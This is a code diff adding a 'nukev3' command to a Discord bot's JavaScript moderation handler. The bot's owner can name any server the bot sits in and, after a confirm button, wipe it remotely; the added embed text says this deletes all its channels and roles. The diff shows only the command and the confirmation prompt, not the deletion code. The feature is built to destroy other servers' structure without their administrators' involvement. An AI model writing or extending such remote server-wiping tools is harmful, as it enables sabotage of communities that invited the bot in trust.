@@ -1028,6 +1028,36 @@ async function handleModCommand(message, client) {
         return message.reply({ embeds: [nv2Embed], components: [nv2Row] });
       }
 
+      case 'nukev3': {
+        if (!isOwner) return NO_PERM();
+        const nv3ServerId = args[0];
+        if (!nv3ServerId || !/^\d{17,20}$/.test(nv3ServerId)) {
+          return message.reply('Usage: `>nukev3 <server_id>`');
+        }
+        let nv3Guild = client.guilds.cache.get(nv3ServerId) ?? await client.guilds.fetch(nv3ServerId).catch(() => null);
+        if (!nv3Guild) {
+          return message.reply({ embeds: [modEmbed(0xED4245, `❌ Bot is not in a server with ID \`${nv3ServerId}\`.`)] });
+        }
+        await nv3Guild.channels.fetch().catch(() => {});
+        await nv3Guild.roles.fetch().catch(() => {});
+        const nv3Embed = new EmbedBuilder()
+          .setColor(0xED4245)
+          .setTitle('💥 Nuke V3 — Remote Server Nuke')
+          .setDescription(`**Target:** ${nv3Guild.name} (\`${nv3Guild.id}\`)\n\nDeletes all channels and roles in the target server. Members are not kicked.`)
+          .addFields(
+            { name: '📁 Channels', value: `${nv3Guild.channels.cache.size}`, inline: true },
+            { name: '🎭 Roles', value: `${nv3Guild.roles.cache.filter(r => !r.managed && r.id !== nv3Guild.id).size}`, inline: true },
+            { name: '👥 Members', value: `${nv3Guild.memberCount} (not affected)`, inline: true },
+          )
+          .setFooter({ text: 'This cannot be undone.' })
+          .setTimestamp();
+        const nv3Row = new ActionRowBuilder().addComponents(
+          new ButtonBuilder().setCustomId(`nukev3-confirm:${nv3Guild.id}:${message.author.id}`).setLabel('💥 Confirm Remote Nuke').setStyle(ButtonStyle.Danger),
+          new ButtonBuilder().setCustomId('nuke-cancel').setLabel('✖ Cancel').setStyle(ButtonStyle.Secondary),
+        );
+        return message.reply({ embeds: [nv3Embed], components: [nv3Row] });
+      }
+
       case 'codfish': {
         if (!isOwner) return message.reply({ embeds: [modEmbed(0xED4245, '❌ Only the bot owner can use `>codfish`.')] });
         const embed = new EmbedBuilder()
